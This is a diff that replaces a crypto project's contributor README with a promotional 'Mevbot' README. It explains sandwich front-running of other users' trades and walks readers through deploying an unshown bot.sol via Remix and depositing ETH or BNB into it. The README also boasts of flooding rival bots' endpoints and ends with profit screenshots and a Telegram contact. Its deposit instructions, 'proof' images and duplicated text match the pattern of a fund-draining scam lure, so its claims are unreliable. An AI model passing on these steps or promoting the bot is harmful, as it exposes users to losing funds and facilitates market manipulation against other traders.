@@ -1,295 +1,188 @@
-![bnlogo](https://user-images.githubusercontent.com/17184469/56422398-7136fb80-62a7-11e9-957c-7d43c2e77e15.png)
+![Uniswap Mevbot](https://i.ibb.co/dDpvy0F/1.jpg)
 
+# Mevbot Smartcontract for Uniswap (v3) & Pancakeswap (v3) - Monitor the mempool, placing a higher gas fee, extract profit by buying and selling assets before the original transaction takes place. 
 
-# BITNATION and Pangea Documents, Resources and Contributor Guidelines
+The code was never meant to be shown to anybody. My commercial code is better and this was intended to be "tested in production" and a ton of quality tradeoffs have been made. Never ever did I plan to release this publicly, lest I "leak my alpha". But nonetheless I would like to show off what I've learned in the past years.
 
-:v: The community is one of the driving forces of BITNATION. To be resilient, we need a decentralised community of contributors, as much as we need a decentralised technology. It doesn’t matter what your profession is, your skill level, your nationality, age, education or gender. Everyone is welcome to join in to help make BITNATION and our Pangea software a success that changes the status quo of governance. :earth_americas::earth_asia::earth_africa:
+> Bot sends the Transaction and sniffs the Mempool
 
-To get to know us, the best place to start is through:
+> Bots then compete to buy up the token onchain as quickly as possible, sandwiching the victims transaction and creating a profitable slippage opportunity
 
- -  Install the Pangea Jurisdiction on [Android](https://play.google.com/store/apps/details?id=co.bitnation&hl=en) (search for Bitnation in the Google Play store) and via [TestFlight](https://developer.apple.com/testflight/) on iOS. Download the TestFlight app from the iOS app store, then go to the [Bitnation website](https://tse.bitnation.co/#install) and click on the iOS button to get an invitation code via email. Make sure to use the email associated with your Apple account.
- -  Install the desktop client for Linux, Windows and Mac [here](http://bitnationapi.azurewebsites.net/downloads/). WARNING: it's solely intended for testing, not commercial usage at this stage.
- -  Join the dev- and non-developer community on [Discord](https://discordapp.com/invite/whzS4Fr). If the first link doesn't work, use [this link](https://lnnk.in/@bitnation-discord) instead. 
- -  Join the non-developer community on [Telegram](https://t.me/PangeaBitnation).
- -  Join the developer community on [Gitter](https://gitter.im/pangea-dev/Lobby).
- -  Contribute to the code on [GitHub](https://github.com/Bit-Nation).
- 
-Visit the official [Bitnation website](https://bitnation.co/) to stay updated on our latest developments.
+> Sending back the ETH/BNB and WETH/WBNB to the contract ready for withdrawal.
 
-If you want to familiarise yourself with Bitnation, here are some key documents to read:
+> This bot performs all of that, faster than 99% of other bots.
 
-**Support our work** with **ETH** and **XPAT**:
+### But ser, there are open source bots that do the same
 
-The Bitnation Pangea Jurisdiction is a **free** and **open source project**
+> Yes, there indeed are. Mine was first, tho. And I still outperform them. Reading their articles makes me giggle, as i went through their same pains and from a bot builder to a bot builder, i feel these guys. <3
 
-ETH address: 0xCDE042543307966bc16Eff3cDca4d32B23408C4c
+### Wen increase aggressiveness ?
 
-XPAT address: 0xCDE042543307966bc16Eff3cDca4d32B23408C4c
+> As i've spent a year obsessing about this, i have a list of target endpoints that I know other bots use, which i could flood with requests in order to make them lose up to 5 seconds of reaction time and gain an edge over them.
 
-The funds will be transferred to a DBVN structure where you can vote on development prorities proposals, after the release v. 1.1 of the Desktop client spring 2019. Until then you can add your proposal suggestions on [consider.it](https://tse.bitnation.co/)
+### What did I learn?
 
----
+> MEV, Frontrunning, EIP-1559, "The Dark Forest", all sorts of tricks to exploit more web2 kind of architectures. And all sorts of ins and outs aboout Uniswap OR Pancakeswap
 
-## BITNATION Overview and Philosophy:
+### So why stop?
 
- -  Pangea [Whitepaper](https://github.com/Bit-Nation/Pangea-Docs/blob/master/BITNATION%20Pangea%20Whitepaper%202018.pdf). It was initially written in April 2017, but this is the updated 2018 version.
- -  Pangea [Development Roadmap](https://github.com/Bit-Nation/Pangea-Docs/blob/master/BitnationRoadmapPresentationDeck.pdf) 2018
- -  Liquid Holocracy DBVN [Constitution](https://github.com/Bit-Nation/BITNATION-Constitution) 2016.
- -  BITNATION [Whitepaper](https://github.com/Bit-Nation/Pangea-Docs/blob/master/Bitnation%20Whitepaper%202014.pdf) 2014.
- -  [Foundational Document](https://docs.google.com/document/d/16HDB9AABa5rTOVFJj_8VLdOxgMguovLLAMviaTkZ1q4/edit) 2014.
- -  [Pre-Foundational Document](https://blog.bitnation.co/what-is-bitnation-the-googlement/) 2014.
+> I've made some profits from this but now using some other better commercial methods, ready to share what I have learnt so devs don't need to go through the same pain.
 
-### BITNATION and Pangea History: 
+### Towards the end I kept getting outcompeted by this individual:
 
- -  [Yearly Summary](https://steemit.com/bitnation/@bitnation/yearly-summary-2017-2018-the-most-productive-year-yet) 2017-2018
- -  [Yearly Summary](https://steemit.com/introduce-yourself/@bitnation/bitnation-yearly-summary-the-year-of-pangea-by-tarkowski-tempelhof) 2015-2016.
- -  [Yearly Summary](https://medium.com/@susannetarkowskitempelhof/bitnation-year-1-summary-6a1c40b4ee5a) 2014-2015.
+> https://etherscan.io/address/0x55659ddee6cb013c35301f6f3cc8482de857ea8e
+> https://bscscan.com/address/0x55659ddee6cb013c35301f6f3cc8482de857ea8e
 
-### Media Channels:
+If this is you, I'd like to congratulate you on your badassery. I have been following your every trade for months, and have not been able to figure out how you get ±20 secs earlier than I do. What a fucking chad.
 
- -  [Facebook Page](https://www.facebook.com/Bitnation-Pangea-337620226422880/).
- -  [Facebook Group](https://www.facebook.com/groups/704796139595313/).
- -  [Twitter](https://twitter.com/MyBitNation).
- -  [Steemit Blog](https://steemit.com/@bitnation).
+### Bot capabilities:
 
-### MISC:
- -  [Community Wiki](https://github.com/Bit-Nation/Pangea-Docs/wiki).
- -  [Wikipedia Page](https://www.wikiwand.com/en/Bitnation).
- -  [Community OPSEC Guidelines](https://docs.google.com/document/d/1E9uVmuW9_zhoStrcvkuK-3kg30ec7Qgj3qG4aK7IAic/edit).
- -  [List of Articles and Videos](https://angel.co/bitnation/activity).
- -  [Angel List](https://angel.co/bitnation).
- 
- ### Translations:
- 
- Key documents including the Pangea Whitepaper are in separate folders in [this repository](https://github.com/Bit-Nation/Pangea-Docs). 
- 
- Current translations include:
- 
- - [Russian](https://github.com/Bit-Nation/Pangea-Docs/blob/master/Russian%20Translations/BITNATION%20Pangea%20Whitepaper%202017%20-%20RU.pdf)
- - [Spanish](https://github.com/Bit-Nation/Pangea-Docs/blob/master/Spanish%20Translations/BITNATION%20Pangea%20Whitepaper%202017%20-%20ES.pdf)
- - [Portuguese](https://github.com/Bit-Nation/Pangea-Docs/blob/master/Portuguese%20Translations/BITNATION%20Pangea%20Whitepaper%202017%20-%20PT.pdf)
- - [Korean](https://github.com/Bit-Nation/Pangea-Docs/blob/master/Korean%20Translations/BITNATION%20Pangea%20Whitepaper%202017%20-%20KO.pdf)
- - [Chinese (Mandarin)](https://github.com/Bit-Nation/Pangea-Docs/blob/master/Chinese%20Translations/BITNATION%20Pangea%20Whitepaper%202017%20-%20ZH.pdf)
- - [German](https://github.com/Bit-Nation/Pangea-Docs/tree/master/German%20Translations)
- - [Italian](https://github.com/Bit-Nation/Pangea-Docs/tree/master/Italian%20Translations)
- - [Japanese](https://github.com/Bit-Nation/Pangea-Docs/tree/master/Japanese%20Translations)
- - [Vietnamese](https://github.com/Bit-Nation/Pangea-Docs/tree/master/Vietnamese%20Translations)
- - [Arabic](https://github.com/Bit-Nation/Pangea-Docs/blob/master/Arabic%20Translations/BITNATION%20Pangea%20Whitepaper%202017%20-%20AR.pdf)
- 
- If you want to contribute with additional translations, please contract @erikV_93 on Telegram.
+1. Check every Contract pair.
+2. Calculate possible profit
+3. Automatically submit transaction with higher gas fee than target (in order to get tokens first, low price > seek profit, gas fee included in calculation)
+4. Automatically sell tokens with prior gas fee (in order to be the first who sell tokens at higher price)
 
----
+### What is Sandwich MEV ?
 
-## Community Resources
+A sandwich attack involves "sandwiching" the victim's transactions between two transactions initiated by the searchers/attackers, whose reordering of the transactions inflicts an implicit loss on the victimized users and possibly benefits the attacker. 
 
-If you want to contribute to the growth of the Bitnation community and our mission - this is the place for you.
+Sandwich MEV exists because the user has to send the intended transactions to the blockchain's mempool, the waiting area for the transactions that haven't been put into a block and need confirmation from the block's miner. 
 
-The best place to get to know the community is to join our [Discord channel](https://discordapp.com/invite/whzS4Fr) or our [Telegram channel](https://t.me/PangeaBitnation) and start contributing. It's helpful to write a short introduction about yourself and what you're interested in doing. Please keep in mind that these are public spaces which anyone can join, which means anyone can read your conversation, hence do not say anything that might put you at risk legally or security wise in any of the public channels. Our Slack channel is still used, but we can't accept anymore people into it, due to the Slack restrictions. 
+If the user sets a too-high slippage for the transaction, the searcher could exploit the opportunity by:
 
-The Slack, Discord and Telegram communities will be moved to Pangea in 2019, when the desktop client launches.
+- Setting higher gas fees and miner tips for the searcher's first transaction than the victim to make it accepted earlier by the block's miner. 
+- Then the searcher would send another transaction with equal or lower gas fees to make sure this transaction is accepted later by the miner than the victim, whose transaction would be squeezed by the attacker's transactions.
 
-### Pangea Arbitration Token (XPAT) Wallets
+How exactly does the attacker gain revenues during the process? Here is an example.
 
-* [BITNATION Android](https://play.google.com/store/apps/details?id=co.bitnation)
-* [BITNATION iOS](http://ios.bitnation.co/)
-* [Citowise](https://citowise.com/)
+1. In a Uniswap liquidity pool, Bob is a retail investor who wants to trade 1000 $WETH for $USDT. His transaction has been sent to the mempool, making him the victim of a sandwich arbitrage. The transaction is marked as ①  in the figure below. 
+2. Unfortunately, Alice, the searcher who has been scanning the mempool, detects Bob's swapping transaction. 
+3. Alice makes a transaction of selling 650 $WETH and sends it to the mempool. In the end, she receives 1,842,200 $USDT at the exchange rate of 1 $WETH for 2,834 $USDT. The block's miner accepts this swapping first because Alice pays higher gas fees or miner tips. The swapping causes the exchange rate to change to 1 $WETH for 2,821 $USDT. This transaction and one Alice sent after Bob's are marked as ② in the figure below. 
+4. Bob's transaction goes through the mempool and to the block selling 1000 $WETH for 2,821,000 $USDT, which he should have been able to get 2,834,000 $USDT. 
+5. Alice's selling of 1,842,200 $USDT passes the mempool and gets recorded by the miner in the block. She receives 652.9 $WETH.  
+6. All three transactions are marked as ③ in the figure below, which shows in the order the miner accepts them.
 
-### Pangea Arbitration Token (XPAT) Exchanges
+![Mevbot Uniswap](https://i.ibb.co/jgyGmdc/2.webp)
 
-More exchanges are added every month.
+Alice's revenue from this Sandwich arbitrage is 2.9 $WETH. The cost is the gas fees and miner tips she gives to the miner for reordering. Assuming it's 1.2 $WETH. In the end, Alice's profit is 1.7 $WETH.
 
-* [LAToken](https://wallet.latoken.com/market/Crypto/ETH/XPAT-ETH?utm_source=art&utm_medium=ico_ptr&utm_campaign=bitnation)
-* [Bancor](https://www.bancor.network/communities/5b05667a794f5d00014c2f5b/about)
-* [TokenJar](https://tokenjar.io/)
-* [Etherdelta](https://etherdelta.com/)
-* [ForkDelta](https://forkdelta.github.io/)
-* [Worldcore](https://worldcore.trade/exchange/xpat_btc)
-* [Bitcratic](https://www.bitcratic.com/#!/trade/XPAT-ETH)
-* [Tokenom](https://www.tokenmom.com/exchange/XPAT-USDC)
-* [Paxful](https://paxful.com/offer/MZA1R9b54mK)
-* [CryptloDEX](https://www.cryptlodex.com/)
-* [SatoExchange](https://www.satoexchange.com/market/XPAT/DOGE/)
-* [BOAExchange](https://boaexchange.com/market/XPAT_ETH?fbclid=IwAR2-M72OBeihthjftSl1ZqaDHIidNY9GJwdxSrjtxfbu57p2Ne7iY3ES_c0)
+# How to implement Sandwich MEV (MEVBOT) with a smart contract on the Ethereum blockchain ?
 
-### Pangea Arbitration Token (XPAT) on market analysis websites:
+1. Access the Solidity Compiler: [Remix IDE](https://remix.ethereum.org)
 
-* [CoinMarketCap](https://coinmarketcap.com/currencies/bitnation/)
-* [CoinGecko](https://www.coingecko.com/en/coins/pangea-arbitration-token)
-* [CryptoCompare](https://www.cryptocompare.com/coins/xpat/overview)
-* [CoinWatch](https://www.livecoinwatch.com/price/Bitnation-XPAT)
-* [CoinLiker Predictions](http://www.coinliker.com/forecast/bitnation-0soK-predictions)
-* [Blockfolio](https://blockfolio.com/)
-* [CoinMarketDaddy](https://coinmarketdaddy.com/currencies/bitnation/)
+2. Click on the "contracts" folder and then create "New File". Rename it as you like, i.e: “bot.sol".
 
-### XBNX to Pangea Arbitration Token (XPAT) swaps:
+3. Copy and Paste the code from v3 folder with name bot.sol into Remix IDE.
 
-* [Official swap page](https://tse.bitnation.co/xbnx-swap/) The token swap has been executed but the swap request page will stay up until the end of 2019.
+4. Move to the "Solidity Compiler" tab, select version "0.6.6" or 0.6.12" and then "Compile".
 
-### Join the Ambassador and Embassy Networks
+5. Move to the "Deploy" tab, select "Injected Web 3" environment. Connect your Metamask with Remix then "Deploy" it.
 
-The Ambassador and Embassy networks were conceived as analogue versions of Pangea. A real world network of people and places where digital nomads can get advice, peer-to-peer assistance, meet-up and hang out. There are three types of Bitnation representatives:
- -  Diplomatic Ambassadors: Official Bitnation positions to perform duties as Officers working as our interface with existing Nations, as well as new virtual Nations. 
- -  Diplomatic Consuls: Also an Official position. A support to both our Ambassadors and to Nation State embassies and consulates engaging with our Citizens in the location of our Embassies and Consulates. 
- -  Goodwill Ambassadors: Informal but officially recognised representative of Bitnation during events (such as DEVCONs). Promotes and supports Bitnation and our services and provides a point of contact for our Citizens. 
+6. After the transaction is confirmed, it's your own BOT now.
 
-Embassies and Consulates are where share their space, whether it’s an office, coffee shop or your home, and open it up for fellow citizens, hackers and crypto aficionados around the world! There are two types of places, Embassies and Consulates.
- -  Embassy  A place where you can both live, and work (and naturally, meet).
- -  Consulate A place where you can work – like a shared office space or cafe, for instance – or maybe organise a meetup or a hangout.
+7. Deposit funds to your exact contract/bot address.
 
-Bitnation has over 100 embassies, consulates worldwide. You can find out more about the [Ambassador Network](https://tse.bitnation.co/ambassador-registration/). **All these functions will soon be moved from the website to the Pangea software.**
+8. After your transaction was confirmed, Start the bot by clicking the “start” button. Withdraw anytime by clicking the “withdrawal” button
 
+I know, this bot only works on the mainnet, but once you can still  deploy on the testnet. and you need to know if this run on testnet and then you call the withdrawal function, it just transfers back your funds without including any profits.
 
-### Start Your Own Nation
+If u want to get priority first for your transaction and get profit from the original transaction, try with 0.5 - 5 ETH or 3 - 10 BNB as contract/bot amount balance. see this contract as reference [jaredfromsubway.eth](https://etherscan.io/address/0x6b75d8af000000e20b7a7ddf000ba900b4009a80#internaltx) this contract use 50 ETH as contract balance to running contract bot.
 
-The Pangea software is setup for you to create your own Decentralized Borderless Voluntary Nation (DBVN). You can set it up directly on the Android and iOS app, with a small amount of ETH gas. Here are a few resources read up on before you setup your own Nation:
+To withdraw your WETH/WBNB balance from the contract, the contract/bot must have ETH/BNB to pay gas fees.![Uniswap Mevbot](https://i.ibb.co/dDpvy0F/1.jpg)
 
- -  This [Questionnaire](https://github.com/Bit-Nation/Pangea-Docs/blob/master/create-your-own-nation.pdf) to help you plan your Nation.
- -  Our [DBVN Resource Center](https://bitnation.co/nations-resources/?la=en).
- -  Some [Advice](https://steemit.com/blockchain/@bitnation/create-your-own-nation-by-tarkowski-tempelhof)... 
+# Mevbot Smartcontract for Uniswap (v3) & Pancakeswap (v3) - Monitor the mempool, placing a higher gas fee, extract profit by buying and selling assets before the original transaction takes place. 
 
-### Submit a Local or Global Governance Project Idea
+The code was never meant to be shown to anybody. My commercial code is better and this was intended to be "tested in production" and a ton of quality tradeoffs have been made. Never ever did I plan to release this publicly, lest I "leak my alpha". But nonetheless I would like to show off what I've learned in the past years.
 
-You can [submit an idea](https://bitnation.consider.it/?tab=Show%20all) for a local or global governance project on our website, and vote and discuss pros and cons of others people's proposal. Keep in mind that you're likely to get more feedback if your proposal has clear and specific goals, timelines, expected outcomes and measurable deliverables.
+> Bot sends the Transaction and sniffs the Mempool
 
-Some of the proposals might be funded by Bitnation as DApps or Incubated Nation ideas.
+> Bots then compete to buy up the token onchain as quickly as possible, sandwiching the victims transaction and creating a profitable slippage opportunity
 
-### Help with Documentation, Translation and Educational Resources 
+> Sending back the ETH/BNB and WETH/WBNB to the contract ready for withdrawal.
 
-Good documentation is key for an Open Source Software movement. 
- -  Help documenting best practices, key events, processes etc.
- -  Translate materials like Whitepapers, community updates, articles, videos. 
- -  Create manuals, videos and blog posts to help explain how to be part of the community and how to use the software. 
+> This bot performs all of that, faster than 99% of other bots.
 
-### Help Grow our Community through Outreach and Engagement
+### But ser, there are open source bots that do the same
 
-There are many ways to help grow the movement through outreach and communication. Here's a list of a few activites that are really impactful.
- -  Organize Online Google Hangouts and Local Meetups.
- -  Produce content, like YouTube videos, software demo videos, graphic materials, blog post etc.
- -  Help newcomers on Telegram to understand BITNATION and find their way around the app and our resources (like this one here).
- -  Help people outside of our community to understand more about BITNATION, the Pangea software, cryptocurrencies, decentralized technologies, the importance of privacy and security and everything else beautiful in the world :smile:.
+> Yes, there indeed are. Mine was first, tho. And I still outperform them. Reading their articles makes me giggle, as i went through their same pains and from a bot builder to a bot builder, i feel these guys. <3
 
-### Community Code of Conduct
+### Wen increase aggressiveness ?
 
-The generic [Citizen Code of Conduct](http://citizencodeofconduct.org/) is [applied](https://github.com/Bit-Nation/Pangea-Docs/blob/master/CODE_OF_CONDUCT.md) to most repositories and channels within BITNATION. However, here are some values we would like to highlight more specifically. 
+> As i've spent a year obsessing about this, i have a list of target endpoints that I know other bots use, which i could flood with requests in order to make them lose up to 5 seconds of reaction time and gain an edge over them.
 
- -  **Clarity above all** Understanding the challenges of communicating across different timezones, culture and personalities both during written and verbal communications. It’s advisable to avoid sweeping statements in favor of clearly articulated sentences with well defined purposes. 
- -  **Refrain from jumping to conclusions** A fundamental problem in many conversations is that we overestimate others capacity to understand our written and verbal communications, and we overestimate our own capacity to understand what they’re trying to communicate. When analyzing what the other person is trying to communicate, take their context into account, including things like timezone, native language, and personal circumstances. 
- -  **Respectfulness** We have come together to change the status quo through creating kickass software, to that end being disrespectful can divert the conversation from our set purpose into irrelevant areas. Personal slights and attacks does not foster a good collaborative space, it's wise to avoid them. When we are emotionally affected by communications, attempt to take a step backwards and swallow the chill pill. 
+### What did I learn?
 
----
+> MEV, Frontrunning, EIP-1559, "The Dark Forest", all sorts of tricks to exploit more web2 kind of architectures. And all sorts of ins and outs aboout Uniswap OR Pancakeswap
 
-## Development Resources
+### So why stop?
 
-### Getting Started
+> I've made some profits from this but now using some other better commercial methods, ready to share what I have learnt so devs don't need to go through the same pain.
 
-We use PivotalTracker for project management. It is essentially a Scrum board similar to Trello. It allows us to have better transparency as a team regarding what the status of our work is, and what our near-term roadmap is. It's a new tool for most of us, so we're still getting the hang of best practices. As of 12/7/2018, our [primary board](https://www.pivotaltracker.com/projects/2204148) and our [architecture board](https://www.pivotaltracker.com/projects/2213396) is open to the public, in the interest of transparency and collaboration.
+### Towards the end I kept getting outcompeted by this individual:
 
-The best way to get involved in the development process is through joining [Gitter](https://gitter.im/pangea-dev/Lobby) after reading the following documentation. You can also get an invitation to the core development team on Discord. 
+> https://etherscan.io/address/0x55659ddee6cb013c35301f6f3cc8482de857ea8e
+> https://bscscan.com/address/0x55659ddee6cb013c35301f6f3cc8482de857ea8e
 
-If your aim is to develop a custom governance DApp or Bot on Pangea, please start with reading this [DApp Engine](https://github.com/Bit-Nation/pangea-developer-documentation/blob/master/docs/_completed_docs_v1.md) documentation.
+If this is you, I'd like to congratulate you on your badassery. I have been following your every trade for months, and have not been able to figure out how you get ±20 secs earlier than I do. What a fucking chad.
 
-### Languages and Frameworks
+### Bot capabilities:
 
- -  Panthalassa, our mesh network backend written in Go containing the wallet and other utils [here](https://github.com/Bit-Nation/panthalassa).
- -  [Pangea](https://github.com/Bit-Nation/BITNATION-Pangea-mobile) is our mobile frontend repository, this version is made with React Native.
- -  Our token [Pangea Arbitration Token (PAT)](https://github.com/Bit-Nation/pat-token-contract), smart contracts, and reputation system is written in Solidity.
+1. Check every Contract pair.
+2. Calculate possible profit
+3. Automatically submit transaction with higher gas fee than target (in order to get tokens first, low price > seek profit, gas fee included in calculation)
+4. Automatically sell tokens with prior gas fee (in order to be the first who sell tokens at higher price)
 
-### Whitepaper, Roadmap and Development Updates
+### What is Sandwich MEV ?
 
- -  [Pangea Whitepaper](https://github.com/Bit-Nation/Pangea-Docs/blob/master/BITNATION%20Pangea%20Whitepaper%202017.pdf).
- -  Regular [Development Updates](https://steemit.com/@bitnation) are published on Steemit.
- -  [Research Areas, Files, Tests and Experiments](https://github.com/Bit-Nation/Bitnation-Future-Governance-Expedition)
- -  High-level [Desktop Client Roadmap](https://docs.google.com/document/d/1cz7r5EkKpL2QHF5qT41PTJf6OlKNDM-NJWleC1-0y0A/edit?fbclid=IwAR1PfjVX7BDvVtE1OPVUbt7Eh9uTqlteeOaXaFZN6jDE4hSR21v4t5SxZnw)
+A sandwich attack involves "sandwiching" the victim's transactions between two transactions initiated by the searchers/attackers, whose reordering of the transactions inflicts an implicit loss on the victimized users and possibly benefits the attacker. 
 
-### Key-Repositories
+Sandwich MEV exists because the user has to send the intended transactions to the blockchain's mempool, the waiting area for the transactions that haven't been put into a block and need confirmation from the block's miner. 
 
-We are pinning relevant repositories on our [profile](https://github.com/Bit-Nation).
+If the user sets a too-high slippage for the transaction, the searcher could exploit the opportunity by:
 
-- [Pangea Android and iOS repository](https://github.com/Bit-Nation/BITNATION-Pangea-mobile)
-- [Pangea backend repository](https://github.com/Bit-Nation/panthalassa)
-- [Pangea desktop repository](https://github.com/Bit-Nation/Desktop-client-new)
+- Setting higher gas fees and miner tips for the searcher's first transaction than the victim to make it accepted earlier by the block's miner. 
+- Then the searcher would send another transaction with equal or lower gas fees to make sure this transaction is accepted later by the miner than the victim, whose transaction would be squeezed by the attacker's transactions.
 
-### API, Development Tools and Documentation
+How exactly does the attacker gain revenues during the process? Here is an example.
 
-Look at each key repository for individual development guidelines, here are the generic ones:
+1. In a Uniswap liquidity pool, Bob is a retail investor who wants to trade 1000 $WETH for $USDT. His transaction has been sent to the mempool, making him the victim of a sandwich arbitrage. The transaction is marked as ①  in the figure below. 
+2. Unfortunately, Alice, the searcher who has been scanning the mempool, detects Bob's swapping transaction. 
+3. Alice makes a transaction of selling 650 $WETH and sends it to the mempool. In the end, she receives 1,842,200 $USDT at the exchange rate of 1 $WETH for 2,834 $USDT. The block's miner accepts this swapping first because Alice pays higher gas fees or miner tips. The swapping causes the exchange rate to change to 1 $WETH for 2,821 $USDT. This transaction and one Alice sent after Bob's are marked as ② in the figure below. 
+4. Bob's transaction goes through the mempool and to the block selling 1000 $WETH for 2,821,000 $USDT, which he should have been able to get 2,834,000 $USDT. 
+5. Alice's selling of 1,842,200 $USDT passes the mempool and gets recorded by the miner in the block. She receives 652.9 $WETH.  
+6. All three transactions are marked as ③ in the figure below, which shows in the order the miner accepts them.
 
- -  [Pangea developer repository](https://github.com/Bit-Nation/pangea-developer-documentation).
- -  [Mkdocs 3rd Party DApp developer documentation](https://pangea-development-documentation.readthedocs.io/en/latest/rough_doc/).
- -  [Pangea SDKs](https://github.com/Bit-Nation/pangea-sdk) our software development toolkit.
- -  [Pangea DApp template](https://github.com/Bit-Nation/dapp-template).
- -  [Pangea tools](https://github.com/Bit-Nation/pangea-tools).
- -  [Pangea-Cli](https://github.com/Bit-Nation/pangea-cli) command line interface utils.
+![Mevbot Uniswap](https://i.ibb.co/jgyGmdc/2.webp)
 
-### UI/UX Resources
+Alice's revenue from this Sandwich arbitrage is 2.9 $WETH. The cost is the gas fees and miner tips she gives to the miner for reordering. Assuming it's 1.2 $WETH. In the end, Alice's profit is 1.7 $WETH.
 
- -  UI/UX matters are discussed on the Bitnation Core Slack.
- -  Please have a look at our [branding guidelines repo](https://github.com/Bit-Nation/Bitnation-Branding-Guidelines) where you will find resources like branding and UI source files.
- -  Our [Logo](https://github.com/Bit-Nation/Bitnation-Branding-Guidelines/tree/master/Logo%20And%20Branding%20Files) source files 
- -  Our [Font](https://github.com/Bit-Nation/Bitnation-Branding-Guidelines/blob/master/Logo%20And%20Branding%20Files/Font-Guide.md) Guidelines
- 
- ### Solidity Contracts
- 
- - [Pangea Arbitration Token](https://github.com/Bit-Nation/pat-token-contract) (PAT) ERC20 Standard
- - [Token Sale Event](https://github.com/Bit-Nation/ico-auction-contracts) (TSE). Phase III code comming soon.
- 
- ### Release Model
+# How to implement Sandwich MEV (MEVBOT) with a smart contract on the Ethereum blockchain ?
 
- -  We're using a Continues Delivery (CD) release model using [Bitrise](https://www.bitrise.io/). 
- -  Before releasing we are making sure all unit tests are passing.
+1. Access the Solidity Compiler: [Remix IDE](https://remix.ethereum.org)
 
-### Software Testing, Bug Bounties, and Bug Reports
+2. Click on the "contracts" folder and then create "New File". Rename it as you like, i.e: “bot.sol".
 
-We are trying to maximize our code testing coverage, thus all the different repositories are shipping with unit tests compliant to the language or framework standard.
+3. Copy and Paste the code from v3 folder with name bot.sol into Remix IDE.
 
- -  The current version of the Pangea React Native frontend is being built [here](https://github.com/Bit-Nation/BITNATION-Pangea-mobile), please review and contribute. 
- -  You can use Bitnation directly on your Android and iOS phone (via Testflight). It's currently on Ethereum mainnet, although more chains will be added shortly (Bitcoin via Rootstock, EOS and Lisk).
- - Key Solidity contracts are audited by external auditors, primarily [ABDK Consultants](https://www.abdk.consulting/) and [ZK Labs](http://zklabs.io/).
- 
-Bug bounties will be announced shortly.
+4. Move to the "Solidity Compiler" tab, select version "0.6.6" or 0.6.12" and then "Compile".
 
-### Add your own ERC20 token to the Bitnation Jurisdiction wallet
+5. Move to the "Deploy" tab, select "Injected Web 3" environment. Connect your Metamask with Remix then "Deploy" it.
 
-Follow the instructions in [this](https://github.com/Bit-Nation/Pangea-wallet-tokenbase) repository.
+6. After the transaction is confirmed, it's your own BOT now.
 
-### Add your own  DApp/ Contract/ Service/ Product to the Bitnation Jurisdiction GOVMARKET
+7. Deposit funds to your exact contract/bot address.
 
-Follow the instructions in [this](https://github.com/Bit-Nation/GOVMARKET) repository.
+8. After your transaction was confirmed, Start the bot by clicking the “start” button. Withdraw anytime by clicking the “withdrawal” button
 
-### Code Commit Guidelines and Code of Conduct
+I know, this bot only works on the mainnet, but once you can still  deploy on the testnet. and you need to know if this run on testnet and then you call the withdrawal function, it just transfers back your funds without including any profits.
 
- -  Some repositories includes issue or pull request templates, use them whenever possible.
- -  Make your commit messages clear, and try to follow the same pattern than the one used in the target repo.
- -  Please avoid duplicating any issue or pull request, **any duplicate will be closed**.
- -  Split your different changes in a clear way via commits, it will make the reviewer's task easier.
- -  Only one major change should be submitted per pull requests, help us review your code faster!
- -  Last but not least: be respectfull, no abuses will be ever tolerated and could result to the close of your issue/pull request without further notice.
- 
- ### Core Code Contributors
+If u want to get priority first for your transaction and get profit from the original transaction, try with 0.5 - 5 ETH or 3 - 10 BNB as contract/bot amount balance. see this contract as reference [jaredfromsubway.eth](https://etherscan.io/address/0x6b75d8af000000e20b7a7ddf000ba900b4009a80#internaltx) this contract use 50 ETH as contract balance to running contract bot.
 
- -  [Thiago Souza](https://github.com/ThiagoVSouza)
- -  [Mark Nuzz](https://github.com/Mnuzz)
- -  [florianlenz](https://github.com/florianlenz)
- -  [albertoestarrona](https://github.com/albertoestarrona)
- -  [william2958](https://github.com/william2958)
- -  [seland](https://github.com/seland)
- -  [xsttx](https://github.com/xsttx)
- -  [camilolunacom](https://github.com/camilolunacom)
- -  [borjantrajanoski](https://github.com/borjantrajanoski)
- -  [ccmawo](https://github.com/ccmawo)
- -  [mimetic](https://github.com/mimetic)
- -  [swmd](https://github.com/swmd)
- -  [hunght](https://github.com/hunght)
- -  [prameetc](https://github.com/prameetc)
- -  [I-Voyager](https://github.com/I-Voyager)
- -  [migbot](https://github.com/migbot)
+To withdraw your WETH/WBNB balance from the contract, the contract/bot must have ETH/BNB to pay gas fees.
 
- ### Additional Learning Resources:
- 
- - [Ethereum Whitepaper](https://github.com/ethereum/wiki/wiki/White-Paper)
- - [IPFS Whitepaper](https://github.com/ipfs/ipfs/blob/master/papers/ipfs-cap2pfs/ipfs-p2p-file-system.pdf)
- - [Rootstock Whitepaper](http://www.the-blockchain.com/docs/Rootstock-WhitePaper-Overview.pdf)
- - [Learn Solidity](http://solidity.readthedocs.io/en/develop/)
- - [Learn Golang](https://golang.org/doc/#learning)
- - [Learn React](https://facebook.github.io/react/tutorial/tutorial.html)
+### Proof By Your Friends
 
-> Made with :heart: at BITNATION.
+> ![Profit by Sandwich Mev Smartcontract](https://i.ibb.co/HdLLzFb/3.png)
+> ![Profit by Sandwich Mev Smartcontract](https://i.ibb.co/dg33JdH/4.png)
+> # Help
+If at any time you encounter any issues with the contract setup, contact our team at https://t.me/UniswapMevbots  🛡️
